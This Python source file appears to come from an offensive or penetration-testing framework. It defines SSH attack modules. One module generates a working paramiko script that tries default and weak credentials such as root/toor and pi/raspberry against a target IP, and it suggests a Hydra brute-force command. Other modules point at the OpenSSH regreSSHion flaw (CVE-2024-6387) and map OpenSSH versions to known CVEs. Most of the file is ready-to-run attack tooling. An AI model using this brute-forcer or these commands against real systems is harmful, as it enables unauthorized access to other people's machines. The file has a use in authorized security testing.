"""Attack modules: ssh."""

from __future__ import annotations

from tools.attack_modules.base import AttackModule, ModuleContext
from typing import Any

class SSHBruteForce(AttackModule):
    name = "SSHBruteForce"
    description = "Brute-force SSH with Hydra using default/weak credentials"
    target_services = ["ssh"]
    target_ports = [22, 2222, 8022]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Tests common SSH credentials. Use with caution and rate limiting.",
            "suggested_command": f"hydra -t 4 -V -f -L users.txt -P passwords.txt ssh://{ctx.target_ip}",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import paramiko, sys, itertools, time
host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
users = ["root", "admin", "user", "test", "guest", "ubuntu", "pi"]
passwords = ["root", "admin", "password", "123456", "ubuntu", "raspberry", "toor", "guest"]
found = []
for u, p in itertools.product(users, passwords):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=u, password=p, timeout=5, banner_timeout=5, auth_timeout=5)
        found.append((u, p))
        client.close()
        break
    except paramiko.AuthenticationException:
        pass
    except Exception:
        pass
    finally:
        time.sleep(0.5)
if found:
    print(f"SUCCESS: {{found[0][0]}} / {{found[0][1]}}")
else:
    print("No default credentials found")
"""

class RegreSSHion(AttackModule):
    name = "RegreSSHion"
    description = "OpenSSH regreSSHion RCE (CVE-2024-6387)"
    target_services = ["ssh"]
    target_ports = [22, 2222]
    required_cves = ["CVE-2024-6387"]

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "CVE-2024-6387: OpenSSH signal handler race condition leading to RCE. Affects < 4.4p1 and 8.5p1 < 9.8p1.",
            "suggested_command": f"python3 regresshion_checker.py {ctx.target_ip}",
            "references": [
                "https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt",
                "https://nvd.nist.gov/vuln/detail/CVE-2024-6387",
            ],
        }

class OpenSSHCVECheck(AttackModule):
    name = "OpenSSHCVECheck"
    description = "Map OpenSSH version to known CVEs and generate exploit scripts"
    target_services = ["ssh"]
    target_ports = [22, 2222]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        version = ""
        for svc in ctx.services:
            if svc.get("service", "").lower() == "ssh":
                version = svc.get("version", "")
                break

        cves = self._map_version_to_cves(version)
        return {
            "status": "info",
            "module": self.name,
            "version": version,
            "cves": cves,
            "note": f"OpenSSH {version} mapped to {len(cves)} known CVEs",
        }

    @staticmethod
    def _map_version_to_cves(version: str) -> list[dict[str, str]]:
        import re
        cves = []
        if not version:
            return cves
        match = re.search(r"(\d+\.\d+(?:p\d+)?)", version)
        if not match:
            return cves
        ver = match.group(1)
        parts = ver.split(".")
        major = int(parts[0])
        minor_str = parts[1] if len(parts) > 1 else "0"
        patch = 0
        if "p" in minor_str:
            minor, patch_str = minor_str.split("p", 1)
            minor = int(minor)
            patch = int(patch_str)
        else:
            minor = int(minor_str)

        mappings = [
            ((0, 0, 0), (4, 4, 0), "CVE-2024-6387", "regreSSHion RCE"),
            ((8, 5, 0), (9, 8, 0), "CVE-2024-6387", "regreSSHion RCE"),
            ((0, 0, 0), (9, 3, 1), "CVE-2023-38408", "PKCS#11 remote code execution"),
            ((0, 0, 0), (9, 3, 0), "CVE-2023-28531", "ssh-agent forwarding vulnerability"),
            ((6, 2, 0), (8, 8, 0), "CVE-2021-41617", "privilege escalation via supplemental groups"),
            ((0, 0, 0), (8, 3, 0), "CVE-2020-15778", "scp command injection"),
            ((0, 0, 0), (7, 7, 0), "CVE-2018-15473", "user enumeration"),
            ((0, 0, 0), (7, 2, 0), "CVE-2016-6210", "user enumeration via timing"),
        ]
        for low, high, cve, desc in mappings:
            if low <= (major, minor, patch) <= high:
                cves.append({"cve": cve, "description": desc, "affected": ver})
        return cves


# ---------------------------------------------------------------------------
# SMB Modules
# ---------------------------------------------------------------------------

